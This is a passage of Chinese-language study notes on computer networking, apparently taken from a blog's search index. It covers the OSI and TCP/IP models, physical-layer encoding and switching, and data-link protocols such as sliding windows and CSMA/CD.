服务数据单元为完成用户所要求的功能而应传送的数据 PCI 协议控制信息控制协议操作的信息 PDU 协议数据单元对等层次之间传送的数据单位$$PCI+SDU=PDU$$ 分层的原则 各层之间相互独立, 每层只实现一种相对独立的功能 每层之间界面自然清晰, 易于理解, 相互交流尽可能少 结构可分割开, 每层采用最合适的技术实现 保持下层对上层的独立性, 上层单向使用下层提供的服务 整个分层结构能促进标准化工作 OSI 参考模型目的: 支持异构网络系统的互联互通上四层为端到端通信, 而下三层为点到点的通信 应用层所有能和用户交互产生网络流量的程序 表示层用于处理在两个通信系统中交换信息的表示方式(语义和语法) 功能 数据格式变换 数据加密解密 数据压缩和恢复 会话层向表示层实体/用户进程提供建立连接并在连接上有序的传输数据, 也称为建立同步 功能 建立,管理,终止会话 使用校验点是会话在通信失效时从校验点(同步点)继续恢复通信, 实现数据同步适合传输大文件 传输层复制主机两个进程的通信, 及端到端的通信.传输单位是报文段或用户数据报 功能 可靠传输, 不可靠传输 差错控制 流量控制 复用分用复用: 多个应用层进程可同时使用下面运输层的服务分用: 运输层把收到的信息分别交付给上面应用层中相应的进程 网络层把分组从源端传到目的端, 为分组交换网上的不同主机提供通信服务传输单位是数据报/分组 功能 路由选择选择最佳路径 流量控制 差错控制 拥塞控制 数据链路层把网络层传下的数据报组装成帧传输单位是帧 为网络层提供 无确认无连接服务 有确认无连接服务 有确认面向连接服务 功能 成帧定义帧的开始和结束 差错控制帧错+位错 流量控制 访问(接入)控制控制对信道的访问 物理层在物理媒体上实现比特率的透明传输传输单位是比特 功能 定义接口特性 定义传输模式单工, 半双工, 双工 定义传输速率 比特同步 比特编码 TCP/IP 参考模型 与 OSI 模型的相同点 都分层 基于独立的协议栈的概念 可以实现异构网络互联 与 OSI 模型的不同点 OSI 定义三点:服务, 协议, 接口 OSI 先出现, 参考模型先于协议发明, 不偏向特点协议而 TCP/IP 是现有协议后又参考模型 TCP/IP 考虑异构网互联问题, 将 IP 作为重要层次 两种模型的通信方式有区别 OSI TCP/IP 网络层 无连接+面向连接 无连接 传输层 面向连接 无连接+面向连接 5 层参考模型综合了 OSI 与 TCP/IP 的优点","link":"/2021/07/10/network1/"},{"title":"物理层","text":"物理层解决如何在连接各种计算机的传输媒体上传输数据比特流 主要任务确定与传输媒体接口有关的特性 机械特性定义物理连接的特性, 规定物理连接时所采用的规格,接口形状,引线数目,引脚数量和排列情况 电气特性规定传输二进制位时, 线路上信号的电压范围,阻抗匹配,传输速率和距离限制等 功能特性指明某条线上出现的某一电平表示何种意义,接口比肩的信号线的用途 规程特性定义各条物理线路的工作规程和时序关系 数据通信模型 1234567输入信息-&gt;[信源]-&gt;输入数据-&gt;[发送器]-&gt;发送的信号-&gt;[传输系统]-&gt;接收的信号-&gt;[接收器]-&gt;输出数据-&gt;[信宿]-&gt;输出信息 | | | | 源系统 | 传输系统 | 目的系统 | | 相关术语通信的目的时传送消息 消息语音,文字,图像等 数据 data传送信息的实体,是有意义的符号序列 信号数据的电器/电磁的表现, 是数据在传输过程中的存在形式数字信号(离散信号): 消息的参数的取值是离散的模拟信号(连续信号): 消息的参数的取值是连续的 信源产生和发送数据的源头 信宿接收数据的终点 信道信号的传输媒介 按传输信号分分为模型信道和数字信道 按传输介质分分为无线信道和有线信道 - 通信方式 通信方式 特点 需要信道数 单工通信 只有一个方向的通信而没有反方向的交互,只能往一个方向发送消息 1 条 半双工通信(双向交替通信) 通信双方都可以发送或接收信息,双方不能同时发送和接收 2 条 全双工通信(双向同时通信) 通信双方可以同时发送和接收消息 2 条 数据传输方式 传输方式 传输方法 特点 串行传输 将表示一个字符的 8 位二进制数据由低到高位的顺序依次发送 速度慢,费用低,适合远距离 并行传输 将表示一个字符的 8 位二进制数同时通过 8 条信道发送 速度快,费用高,使用近距离 > 并行传输用于计算机内部的数据传输 传输方式 传输方法 同步传输 以一个数据区块为单位,先送出 1 个或多个同步字符,在送出整批的数据, 需先送出一个或多个同步字符,在送出整批数据 异步传输 将比特分成小组传送,发送方考研在任何时刻发送比特组,接收方不知道何时到达,传输数据时,加一个字符起始位和终值位 码元码元是指用一个固定时长的信号波形, 代表不同离散数值的基本波形, 是数字通信中数字信号的计量单位其中时长内的信号称为 k 进制码元, 而时长称为码元宽度当码元的离散状态有 M 个时(M 大于 2), 称为 M 进制码元1 码元可以携带多个比特的信息量 K 进制码元-&gt;码元的离散状态有 K 个-&gt;K 中高低不同的信号波形 奈氏准则和香农定理(重要) 影响失真程度的因素: 1.码元传输速率;2.信号传输距离;3.噪声干扰;4 传输媒体质量码间串扰: 接收端收到的信号波形失去了码元之间清晰界限的现象 若题目中没明确要求使用哪种方法,且两者方法都能计算出极限传输率, 则取较小的为结果 奈氏准则 奈氏准则限制码元的传输速率一个相位可以有多种振幅, 故$码元的种数=相位数 \\times 振幅数$如题目中说 n 进制信号, 你即为码元的种数 在理想低通(无噪声, 带宽受限)条件下, 为了避免码间串扰, 极限码元传输速率为 2W Baud, W 是信道带宽(单位为 Hz) $$极限传输率=2Wlog_2V(b/s)$$其中 V 为码元的种数 通过奈氏准则,可知: 在任何信道中, 码元的传输速率是有上限的若超过此上限, 会出现码间串扰的问题 信道的频带越宽(能通过的信号越多), 可以使用更高的速率进行码元的有效传输 奈氏准则限制信息传输速率 要提高数据的传输率. 可以使每个码元携带更多比特信息 香农定理在带宽受限且有噪声的信道中, 为了不产生误差, 信息的数据传输速率有上限值 $$信噪比=\\frac{信号的平均功率}{噪声的平均功率}, 记为\\frac{S}{N}\\\\信噪比(分贝dB)=10log_{10}(S/N)$$ 注意上面的信噪比不带单位, 下面的信噪比带单位, 做题时要看清楚题目给的$\\frac{S}{N}$是否带单位 $$信道的极限数据传输速率=Wlog_2(1+\\frac{S}{N})(b/s)$$ W 为带宽 根据香农公式可知: 信道的带宽或信道中的信噪比越大, 则信息的极限传输速率就越高 对一定的传输带宽和一定的信噪比, 信息传输速率的上限就确定了 若信息的传输速率低于信道的极限传输速率, 则一定能找到方法实现无差错传输 实际信道的传输速率比香农定理计算饿极限信息传输速率低 若带宽 W 或信噪比($\\frac{S}{N}$)无上限, 则极限信息传输速率也没上限 编码和调制 基带信号将数字信号 1 和 0 直接用两种不同的电压表示, 在传输到数字信道上取传输(基带传输) 发出的是直接表达了要传输的信息的信号 宽带信号将基带信号进行调制后形成的频分复用模拟信号, 在传送到模拟信道上去传输(宽带传输, 频带传输) 距离较近时, 使用基带传输, 较远时, 使用宽带传输 编码是将数据变成数字信号或将模拟数据编码为数字信号调制是将数据变成模拟信号 编码数字数据编码为数字信号(重要) 编码方式 编码方法 特点 非归零编码(NRZ) 高电平表示 1,低电平表示 0 1.容易实现; 2.没有检错能力; 3.无法判断一个码元的开始和结束,双方难以保持同步 曼彻斯特编码 将一个码元分成 2 个相等的间隔; 前一个间隔为低电平后一个电平为高电平表示码元 0; 码元 1 与之相反 每一个码元中间出现电平跳变, 可作为时钟信号(用于同步),又作为数据信号; 但是占用的频带宽度为原始基带宽度的两倍; 数据传输速率只有调制速率的一半 差分曼彻斯特编码 若码元为 1,则前半个码元的电平与上一个码元的后半个码元的电平相同.码元 0 则相反 (同 1 异 0) 每个码元中间又一次电平跳转,可以实现同步, 且抗干扰性强于曼彻斯特编码 归零编码(RZ) 信号电平在一个码元内要恢复到零 容易长时间不使用信道 反向不归零编码(NRZI) 信号电平翻转表示 0,信号电平不变表示 1 对于全 1 的数据难以识别 4B/5B 编码 比特率中插入额外的比特来打破一串的 0 或 1, 用 5 个比特来编码 4 个比特的数据, 只采用 16 种对于 16 种不同的 4 位码,其他 16 种作为控制码 编码效率为 80% 10BaseT 采用曼彻斯特编码以太网使用曼彻斯特编码, 波特率为数据率的两倍 模拟数据编码为数字信号 在计算机内部处理的都是数字音频 将模拟音频通过采样,量化转换成有限个数字表示的离散序列(音频数字化)典型的例子是脉码调制(PCM),一共分为三步:抽样,量化, 编码 抽样对模拟信号周期性扫描, 把时间上连续的信号变成时间上离散的信号$$f_{采样频率} \\geq 2f_{信号最高频率} $$ $数据传输率 = f_{采样频率} \\times 每个样值得编码位数$若有多路, 则其他路得数据率均要等于最大数据率(使用脉冲填充) 量化把抽样取得的电平幅值按照一定的分级标度转化为对应的数字值, 并取整数, 这就把连续的电平幅值转化为离散的数字量 编码把量化的结果转换为对应的二进制编码 调制数字信号调制为模拟信号发送端将数字信号转换为模拟信号, 接收端将模拟信号还原为数字信号, 分别对应调制解调器的调制和解调过程 调幅调整幅度, 无幅度为 0, 有幅度为 1 调频低频为 0, 高频为 1 调相0 和 1 对应的波形不同 调幅+调相(QAM)(正交振幅调制)两者结合使用相位个数 n,振幅种数 m, 则可以有$n\\times m $种码元 常与链路的信息传输速率结合起来考 模拟数据调制为模拟信号数据交换 报文交换和分组交换为存储转发交换方式无连接服务: 不事先确定传输路径, 每个数据单元独立确定传输路径, 不同数据单元的传输路径可能不同连接服务: 确定一条传输路径, 之后的数据单元都延该路径传输 传输数据量大, 且传送时间远大于呼叫时, 选用电路交换(电路交换传输时延最小) 端到端的通路由很多段链路组成时, 采用分组交换 从信道利用率上, 报文交换和分组交换由于电路交换, 分组交换的交换时延小,适合计算机之间突发式的数据通信 电路交换 原理源结点与目的结点有一条由中间结点构成的专用的物理连接线路, 数据传输结束之前, 线路一直保持使用 阶段建立连接-&gt;通信-&gt;释放连接 特点独占资源, 用户始终占用端到端的固定传输带宽.适用于远程批处理信息传输或系统间实时性要求高的大量数据传输的情况 优点 传输时延小 数据顺序传送, 无失序问题 实时性强, 双方建立物理通路后,可实时通信,适用于交互式会话类通信 全双工通信, 没有冲突, 通信双方有不同的信道, 不会争用物理信道 适用于模型信号和数字信号 控制简单, 电路的交换设备及控制较简单 缺点 建立连接时间长 线路独占, 即使线路空闲, 也不能提供给其他用户使用, 信道使用效率低 灵活性差, 连接通路种出现故障,必须重新拨号建立连接, 不适应突发性通信 无数据存储能力, 难以平滑通信量 数据直达, 不同类型,不同规格,不同速率的终端很难相互进行通信 无法发现与纠正差错, 难以在通信过程种进行差错控制 报文交换 报文时网络交换与传送的数据单元(站点一次性要发送的数据块) 原理无需在站点间建立一条专用的通路, 传送过程采用存储转发的方式 优点 无需建立连接, 无建立连接时延, 用户可随时发送报文 动态分配线路, 动态选择最佳路径, 可以平滑通信量 提高线路可靠性, 某条线路发生故障, 可选择其他线路 提高线路利用率, 可以不同时间分段的占有部分物理通道, 多个报文可共享信道 提供多目标服务, 一个报文可以发往多个目的地址 容易实现代码转换和速率匹配, 收发双方可以不同时处于可用状态, 便于类型,规格,速度不同的计算机之间通信 缺点 实时性差, 数据进入交换结点需要存储转发, 存在转发时延 只适用数字信号 报文长度无限制, 每个中间结点需完整的接收传来的整个报文, 输出线路不空闲时, 可能需要存储几个完整报文等待转发, 因此要求网络这每个结点需要有较大的缓冲区; 有时需要把等待转发的报文存在磁盘上, 进一步增加了传送时延 分组交换 相对于报文交换, 有如下优点 缓冲区易于管理 分组的平均长度固定不变 更易标准化 更适合应用 将数据分割成小块, 逐块发送分组 原理与报文交换工作方式基本相同, 但是分组交换限制所传输的数据单位的长度.发送结点将数据报文划分成一定长度的分组, 以分组为单位进行传输和交换.接收节点将收到的分组组装成信息或报文 优点 无需建立连接, 无需专用通路, 双方可随时发送分组 线路利用率高,可以不同时间分段的占有部分物理通道, 多个报文可共享信道 简化了存储管理, 分组长度固定, 相应的缓冲区大小也固定 加速传输, 后一个分组的存储与前一个分组的转发可用并行操作传输一个分组比一个报文所需的缓冲区小, 减少等待发送时间 减少出错几率和重发数据量, 提高可靠性, 减少传输时延 分组短小, 适用于计算机之间突发式数据通信 缺点 仍存在存储转发时延, 结点交换机必须有更强的处理能力 每个分组需加控制信息, 降低了通信效率, 增加了处理时间 分组交换采用数据报服务时, 可能出现失序,丢失或重复分组, 分组到达目的结点时, 要对分组按编号进行排序等工作采用虚电路服务,有呼叫建立,数据传输和虚电路释放三个过程 数据报方式 特点 为网络层提供无连接服务, 发送发可随时发送分组, 结点可用随时接收分组 同一报文的不同分组到达目的节点时可能发生乱序,重复, 丢失 每个分组在和窜书过程种需携带源地址和目的地址及分组号 分组在存储转发时, 需排队等候处理当通过交换结点的通信量较大或网络拥塞时, 这种时延回大大增加 网络会有冗余路径, 对于故障的适应能力强, 适用突发性通信, 不适于长报文, 会话式通信 虚电路方式 结合电路交换和数据报方式 源主机到目的主机类似于电路的路径(逻辑连接),路径上所有结点需要维持虚电路的建立(每个结点维持一张虚电路表), 每一项记录一个打开的虚电路的信息 特点 为网络层提供连接服务, 源节点与目的结点建立一条逻辑连接 分组通过虚电路顺序传输, 不需要携带源地址,目的地址等信息包含虚电路号, 相对数据报方式开销小同一报文的不同分组到达目的结点时不会乱序,重复或丢失 分组在每个结点只进行差错检测 每个结点可与多个结点建立虚电路, 每条虚电路支持特定的两个端系统之间的数据传输, 可以对两个数据端点的流量进行控制两个端系统之间也可有多条虚电路为不同的进程服务 网络中的结点出现故障失效时, 所有经过该结点的虚电路被破坏 总结 交换方式 特点 适用范围 电路交换 数据有序, 专用通路, 传输时延最小 数字信号和模拟信号 报文交换 报文长度无限制, 数据无序, 能控制差错 数字信号 数据报交换 数据无序, 分组长度有限, 能控制差错 虚电路交换 数据有序, 分组长度有限, 能控制差错 以太网采用的是分组交换 传输介质传输介质(传输媒体/传输媒介)是数据传输系统中发送设备和接收设备之间的物理通路传输介质不是物理层, 传输介质在物理层的下面 导向性传输介质电磁波被导向沿固体(铜线/光纤)媒介传播 双绞线 价格便宜, 在局域网中普遍使用 模拟传输和数字传输都可用使用双绞线 通信距离几公里到几十公里距离远使用模拟传输时,用放大器放大衰减信号距离远使用数字传输时,用中继器将失真信号整型 同轴电缆 根据传送信号不同, 分为基带同轴电缆(传送基带数字信号) 和宽带同轴电缆(基带信号调制成的模拟信号) 抗干扰特性比双绞线好 传输距离更远, 价格更贵 光纤 多模光纤的原理: 光的全反射性 传递光脉冲来进行通信 带宽远大于其他传输媒体的带宽 光纤由纤芯(实心的)和包层构成, 利用全反射原理 特点 损耗小, 中继距离长 抗雷电和电磁干扰性能好 无串音干扰, 保密性好, 不易被窃听或截取数据 体积小, 重量轻 单模光纤 多模光纤 定义 在横向模式直接传输光信号 多种传输光信号模式 光源 定向性好的激光二极管 发光二极管 特点 衰耗小,适合远距离 易失真,适合近距离 非导向性传输介质自由空间, 介质一般为空气,真空, 海水等 无线电波 微波 红外线,激光 方向 信号向所有方向传播 信号固定方向传播 信号固定方向传播 特点 穿透能力强, 可远距离传输,用于通信领域 通信频率高,频段范围宽,数据率高,可用于地面微波接力通信和卫星通信 传输的信号要分别转换为各自的信号格式 卫星通信的优缺点: 优点 通信容量大, 距离远, 覆盖广,广播通信和多址通信 缺点 传播时延长, 受气候影响大, 误码率高, 成本高 物理层设备 不同网段在物理层互联时, 数据传输率要相同, 数据链路层协议可以不同 转发器只具备放大信号的功能 放大器用于远距离的模拟信号传输, 同时也会放大噪声, 引起失真. 网桥连接两个网段扩展物理网络的范围 中继器 5-4-3 规则一个互联网络中至多有 5 个网段, 4 个中继器, 3 个网段作为主机段 对衰减信号进行再生和还原, 不是对衰减信号进行放大, 保持与元数据相同, 以增加信号传输的距离, 延长网络的长度(再生数字信号) 中继器的两端是网段, 适用于完全相同的两类网络互联, 且两个网段的速率要相同 只将电缆段上的数据发送到另一段电缆, 仅作用于信号的电气部分 两端可用连接相同或不同的媒体 两端使用相同的协议 集线器(多端口中继器) 可以扩大网络范围也可以用集线器连接其他集线器来扩展网络范围,使网络范围内的主机能互相通信; 但是会将所有冲突域合并, 及所覆盖的范围内同一时间只有一台主机能发送, 降低了通信效率 对信号进行再生放大转发, 对衰减的信号进行放大, 转发到其他所有处于工作状态的端口(除输入端口) 可以增加信号的传输距离, 延长网络的长度 不具备信号的定向传送能力, 是共享式设备 不能分割冲突域, 因此同一时间只能有一台主机发送信息 各个主机平分带宽","link":"/2021/07/13/network3/"},{"title":"数据链路层","text":"考点(按重要程度排序) 流量控制和可靠传输 介质访问控制 差错检测和差错控制 字符/字节填充法 和 零比特填充法 局域网 和以太网802.3 和无线局域网802.11 链路层设备 数据链路层负责通过一条链路从一个结点向另一个物理链路直接相连的相邻结点传送数据报 结点主机, 路由器 链路网络中两个结点之间的物理通道, 由传送介质的 数据链路网络中两个结点之间的逻辑通道, 实现数据传输协议的硬件和软件 帧链路层的协议数据单元 功能在物理层的基础上向网络层提供服务将源自网络层的数据可靠的传输到相邻结点的目标机网络层主要作用是加强物理层传输原始比特流的功能, 将物理层提供可能出错的物理连接改造成逻辑上无差错的数据链路, 使之对网络层表现为一条无差错的链路 为网络层提供服务无确认无连接服务有确认无连接服务有确认面向连接服务 链路管理建立,维持,释放连接 组帧 流量控制限制发送发 差错控制 封装成帧在一段数据的前后部分添加首部和尾部,构成一个帧接收端在收到物理层的比特流后, 根据首部和尾部标记识别帧的开始和结束 首部和尾部起着帧定界的作用 帧同步接收方能重接收到的比特流区分除帧的起始和终止 组帧的方法 字符计数法帧首部使用一个计数字段(第一个字节)来标明帧内字符数 出错之后双方不能同步通信 字符(字节)填充法 在开头和结尾处添加帧开始标志和帧结束标志, 若帧的内容含有结束标志或转义标志,在改标志前添加一个字节(转义标志)来表示改字符无意义 零比特填充法 同样也有首部标识符和尾部标识符(都是01111110) 发送数据中出现5个连续的1, 则在后面添加一个0 接收数据中出现5个连续的1, 则去掉后面的一个0保证了透明传输,在传输过程中可以发送任意比特组合 违规编码法用编码方案中不会用到的方式来标明帧的开始和结束 差错检测 随机噪声 由于电路本身电器特性产生, 是信道固有,随机存在的提高信噪比减少或避免干扰(传感器) &gt;冲击噪声外界特定的影响, 产生差错的主要原因利用编码技术解决 差错控制具体原理 奇偶校验码(检错编码) 循环冗余码(检错编码)只能做到对帧的无差错接收, 凡是接收端数据链路层接收的帧均无差错 海明码(纠错码) 流量控制与可靠传输机制流量控制接收方控制发送发的发送速度(点对点的控制), 如果接受速度小于发送速度, 则接收端不回复确认 传输层控制发送方的速度是端对端的, 且接收方个发送端一个窗口公告老控制发送发速度 可靠传输发送端发送的数据与接收端接收的数据一致 流量控制控制发送速率, 使接收方有足够的缓冲空间来接收每一个帧 发送窗口发送端正在发送的数据, 一组连续的允许发送的帧的序号 接收窗口接收端接收的数据, 一组连续的允许接收帧的序号 滑动窗口解决流量控制(接收端接收速度慢则不回复确认)和可靠传输(发送方自动重传) 停止等待协议 接收窗口大小=1, 发送窗口大小=1 原理每发送一个分组后停止发送, 等待接收方回复确认后再发送下一个分组 数据帧丢失 发送方在计时器超时后没收到确认帧, 则重新发送数据包, 因此发完一个帧之后要保留该帧的副本, 收到该帧的确认帧后, 才删除副本 数据帧和确认帧需编号,解决帧的丢失和帧的重复问题接收方收到连续的编号相同的数据帧表示发送方超时重传发送方收到连续的编号相同的确认帧表示接收方收到相同的重复帧 计时器: 没发送一个帧就启动一个计时器, 时间比平均 RTT 长 数据帧出错接收方接收到的帧出错, 则直接丢弃该帧, 不回复确认, 发送方等待后超时重传 确认帧丢失接收方的确认帧丢失发送方等待后超时重传, 接收方丢弃重复帧, 并再次发送确认帧 确认帧迟到接收方的确认帧在发送方超时后才到达发送方超时重传, 接收方再次发送确认帧, 接收方对收到重复确认帧不做处理, 只取最先到达的 作用 解决比特出差错, 丢包问题 丢包指数据包丢失 实现流量控制 缺点 信道利用率太低 滑动窗口协议 发送端发送一个帧, 接收端收到一个帧后往后移动并回复一个确认收到, 发送窗口往后移动; 发送发再等待接收确认帧的同时也会将发送窗口内未发送的数据逐一发出 后退 N 帧协议(GBN) 发送窗口大小&gt;1, 接收窗口大小=1 上层的调用上层发送数据时, 发送方检查发送窗口是否已满若未满, 则产生一个帧并发送若已满, 将数据返回给上层, 表示上层已满(实际上发送方可以缓存这些数据, 待窗口不满时在发送帧) 收到确认帧对 n 号帧的确认采用累计确认的方式, 标明接收方已经接收到 n 号帧和之前的所有帧 超时事件出现超时, 发送方重传所有已发送但为确认的帧 丢失事件发送的帧丢失, 接收方有一个期待变量, 用来存放下一个收到的帧的编号, 若没有收到或收到其他非预期编号帧, 则不回复, 发送方因超时未收到确认帧, 重发 滑动窗口长度使用 n 个比特对帧编号, 则发送窗口大小 W 应满足 $1\\leq W\\leq 2^n-1$若发送窗口更大, 接收方无法区别新帧和旧帧 优点提高信道利用率 缺点有一个帧出错, 则其他正确传输正确的帧也许重传, 降低了传输效率 接收数据时, 正确收到 n 号帧,并且按序, 则回复 ACK, 并将该帧的数据部分交付给上层, 其余情况都丢弃帧, 并发送最近按序接收的帧重新发送 ACK 选择重传协议(SR) 发送窗口大小&gt;1, 接收窗口大小&gt;1 设置单个确认, 增大接收窗口, 设置接收缓存, 缓存乱序到达的帧 上层的调用从上层收到数据后, 发送方检查下一个可用于该帧的序号, 若序号位于窗口内, 则发送数据帧否则处理同 GBN 收到一个 ACK收到 ACK, 发送方将被确认的帧标记为已接受若该帧是滑动窗口中的下界(最左边的窗口对应的序号), 则将窗口向后移动到最近未被确认的窗口处;否则不滑动窗口若移动了窗口, 则发送窗口内未被发送的帧 超时事件每个帧对应一个计时器, 超时后重传该帧 滑动窗口长度发送窗口最好等于接收窗口, 大小为 W, 且$W=2^{n-1}$, 其中 n 为用于帧编号的位数 接收方接收全部在接收窗口内的帧(不管是否按序), 并且回返回该帧的确认接收方收到序号更小的帧时, 会将以该序号为起点的连续的已接受的帧交付给上层, 然后移动滑动窗口接收方如果收到接收窗口外(小于窗口下届)的帧, 返回一个 ACK 介质访问控制 点对点链路: 两个相邻节点通过一个链路相连(PPP 协议, 常用于广域网)广播式链路: 所有主机共享通信媒介(常用于局域网) 静态划分信道(信道划分介质访问控制)将使用介质的每个设备与来自同一信道上其他设备的通信隔离开, 把时域和频域资源合理分配给网络上的设备 多路复用技术: 把多个物理信号组合在一条物理信道上进行传输, 使得多个计算机或终端设备共享信道资源, 提高信道利用率(也就是把一条广播信道逻辑上分成几条用于两节点之间通信的互不干扰的子信道, 实际把广播信道转变为点对点的信道) 频分多路复用(FDM)每个用户占用一个频带, 所有用户在同时间占用不同的带宽(频率带宽, 以 Hz 为单位)资源 优点充分利用传输介质带宽, 系统效率高实现比较容易 频带: 不同频率的信号频分多路复用类似与并行, 多个用户可同时使用信道 时分多路复用(TDM)将时间划分为若干段等长的时分复用帧(TDM 帧), 每个用户占用固定序号的时间片段, 所有用户轮流占用信道 TDM 帧是在物理层传送比特流划分的帧, 标志一个周期, 一个周期内含若干个时间片段(时隙)时分多路复用类似与并发, 每个用户轮流使用信道 统计时分复用(STDM)集中器将用户要发送的数据集中后再发送 每一个 STDM 帧中的时隙数小于连接再集中器上的用户数 集中器按用户发送数据的顺序依次放入 ST DM 帧中, 一个帧满后发出 SRDM 帧是按需动态分配时隙 波分多路复用(WDM)相当于光的频分复用, 不同用户使用不同波长的光信号 码分多路复用(CDM)码分多址是码分复用的一种方式 码分多址(CDMA) 将一个比特分成多个码片/芯片(如比特1-&gt;00011011 比特0的码片序列为比特1的反码, 码片写出向量模式时, 0变成-1) 各个站点同时发送数据时, 要求各个站点的码片序列相互正交, 规格化内积为0 发送数据时, 将所有站点要发送的码片序列对应的向量相加后再发送到公共信道 分离数据时, 收到的数据与源站码片序列对应的向量规格化内积,得到1即为1, 得到-1即为0 动态分配信道 也叫动态媒体接入控制/多点接入 信道并非在用户通信时固定分配 轮询访问介质控制(令牌传递协议) 随机访问介质访问控制(必考)所有用户可随机发送信息, 发送信息时占全部带宽, 因此会产生冲突, 通过一下协议来解决冲突(采取一定的措施, 使得两节点之间的通信不会发送相互干扰的情况) 随机访问介质访问控制 ALOHA 协议 纯 ALOHA 协议比时隙 ALOHA 协议吞吐量和效率更低(这里的吞吐量指一段时间内成功发生的平均帧数) 纯 ALOHA 协议相当于想发就发, 时隙 ALOHA 协议只能再时间片段开始时才能发送 纯 ALOHA 协议不监听信道, 不按时间槽发送, 随机重发对于冲突, 则随机一段时间后在重传 $T_0$表示帧从开始发送到发送成功为止冲突指的是接收方对收到的数据检测出差错, 不发送确认, 发送方超时后,判断为冲突 时隙 ALOHA 协议把时间分成相同长的时间片, 所有用户在时间片开始时同步接入网络信道若发生冲突, 则必须等到下一个时间片开始时再发送 CSMA 协议(载波监听多路访问协议)CS(载波监听): 每个站在发送数据前要检测一下总线上时否有其他计算机在发送数据, 若检测超过一定值时, 认为有多个站在同时发送数据, 即产生了冲突MA(多点接入): 多个计算机连接在一根总线上 发送帧之前要监听信道信道空闲时, 发送完整的帧信道忙时, 推迟发送 p-坚持 CSMA 是基于时隙的操作3 种方法在发送冲突后还是要坚持把数据帧发送完 方法 信道空闲 信道忙 出现冲突 优点 缺点 1-坚持 CSMA 直接传输 一直监听,空闲时马上传输 (一段时间内没收到回复)等待一个随机时长在监听,并重发过程 只要媒体空闲,就马上发送,避免媒体利用率的损失 若有两个或以上的站点要发送数据, 则一定会发送冲突 非坚持 CSMA 直接传输 等待一个随机时间后在监听 采用随机的重发延迟时间减少冲突发送的可能性 可能存在大家都在延迟等待的过程,使媒体可能处于空闲状态,媒体利用率低 p-坚持 CSMA 有概率 p 直接传输;1-p 的概率等到下一个时间槽在发送 持续监听直到信道空闲在以概率 p 发送 等到下一时间槽再开始监听 能减少冲突和媒体空闲时间 CSMA/CD 协议(载波监听多点接入/碰撞检测协议)CS(载波监听): 每个站在发送数据前和发送数据时都要检测总线上是否有其他计算机在发送数据MA(多点接入): 多个计算机连接在一根总线上(总线型网络)CD(碰撞检测): 边发送边监听, 判断自己在发送数据时其他站是否也在发送数据(半双工网络); 若发送碰撞,则立马停止发送数据 碰撞后的重传时机 通过截断二进制指数规避算法 确定基本退避(推迟)时间为争用期 $2\\tau$ 定义 k 等于重传次数, k 不超过 10, 即 $k=min(重传次数,10)$当重传次数不超过 10 时, k=重传次数当重传次数大于 10 时, k=10 从 $[0,1,…,2^k-1]$ 中随机取一个数 r, 重传所需的退避时间等于 r 倍的基本退避时间 $2r\\tau$ 重传 16 次仍不成功, 说明网络拥挤, 抛弃此帧向高层报错 最小帧长帧的传输时延至少两倍与信号在总线的传输时延$$最小帧长=总线传播时延 \\times 数据传输率 \\times 2$$ 以太网规定最短帧长为 64B CSMA/CA 协议(载波监听多点接入/碰撞避免协议)发送数据前, 检测信道是否空闲 空闲则发出 RST, RST 包括发射端地址, 接收端地址, 下一份数据将持续发送的时间等信息信道忙则等待 接收端收到 RST 后, 响应发送 CTS(相当于双方建立了连接, 接收端拒收其他主机的 RST) 发送端收到 CTS 后, 发送数据帧(同时预约信道, 发送方告知其他站点自己还要传多久数据) 接收端收到数据帧后, 用 CRC 检验数据是否正确, 正确则相应 ACK 帧 发送端收到 ACK 帧后才能发送下一个数据帧若没收到则一直重传至规定重发次数为止( 二进制指数退避算法 确定随机推迟的时间) 传播时延对载波监听的影响电磁波还未到达主机前, 主机一直认为总线是空闲的, 可以发送数据因此 2 倍的单程端到端传播时延 $2\\tau$ , 即最多经过 $2\\tau$ 才能知道发送的数据与别人发送冲突同时这个 $2\\tau$ 也被称为争用期,冲突窗口.碰撞窗口只要经过 $2\\tau$ 的时间没有发生碰撞, 则能肯定本次发送不会有碰撞 CSMA/CD 用于总显式以太网, CSMA/CA 用于无线局域网 协议 特点 ALOHA 协议 想发就发 CSMA 协议 先听再发 CSMA/CD 协议 先听再发, 边听边发 CSMA/CA 协议 先听再发, 先问在发 CSMA/CD 与 CSMA/CA 的对比 相同点 都属于 CSMA 思路, 先听在发 在接入信道前, 都要进行监听, 信道空闲后才能进行接入 出现冲突后都会进行有上限的重传 不同点 传输介质不同CSMA/CD 用于总线式以太网(有线)CSMA/CA 用于无线局域网(无线) 载波检测方式不同因传输介质不同CSMA/CD 通过电缆中电压的变化来检测, 数据发生碰撞时, 电缆的电压回发生变化CSMA/CA 采用能量检测(ED),载波检测(CS)和能量载波混合检测三种检测信道空闲的方式 CSMA/CS 能检测冲突CSMA/CD 是避免冲突 轮询访问介质访问控制既不产生冲突, 在发送时占有全部带宽 令牌传递协议(重点)(轮询访问介质访问控制)(轮流协议/轮转访问 MAC 协议)主结点轮流询问从属结点是否需要发送数据, 若有结点在发送数据, 则暂停询问, 对应的其他主机也不会发送数据 令牌: 特殊的 MAC 控制帧, 不含任何信息, 用来控制信道的使用, 确保同一时间只有一个结点独占信道(无碰撞) 每一个结点可以在一定时间内(令牌持有时间)获得发送数据的权力, 但不能无限制的持有令牌常用于负载较重, 通信量较大的网络中 缺点 令牌开销 存在等待延迟 如果换中有结点出故障, 则链路错误 比较 |方式|特点||信道划分介质访问控制|1. 不会产生冲突; 2.基于多路复用技术划分资源; 3.网络负载重时, 共享信道效率高, 且公平; 4.网络负载轻时, 共享信道效率低||随机访问介质访问控制|1. 会产生冲突; 2.用户根据意愿随机发送信息, 发送信息时独占信道带宽; 3.网络负载重时, 产生冲突开销,网络负载轻时, 共享信道效率高, 单个节点可利用信道全部带宽||轮询访问介质访问控制||轮询访问介质访问控制|1. 既不产生冲突, 在发送时占有全部带宽; 2. 轮询开销; 3. 有等待延迟(需要按顺序询问, 后面的主机需要等待询问到才能发送); 4. 单点故障(主结点故障, 则网络瘫痪)| 局域网基本概念和体系结构 局域网(LAN) 在某一区域内多台计算机互联组成的计算机组 特点: 覆盖范围小, 在一个相对独立的局部范围内联 使用专门的传输介质(双绞线,同轴电缆), 数据传输率高 通信延迟时间短, 误码率低, 可靠性高 各站平等, 共享传输信道 多使用分布式控制和广播式通道, 能广播和组播 由网络拓扑,传输介质与介质访问控制方法判断是否位局域网 局域网的网络拓扑: 拓扑类型 组成 优点 缺点 星型拓扑 中间结点与其他各结点相连 传输速度快, 网络结构简单, 建网容易, 便于控制和管理 网络可靠性低, 共享能力差, 有单点故障问题 总线型拓扑 多台计算机连接到一条总线上 网络可靠性高, 节点响应速度快, 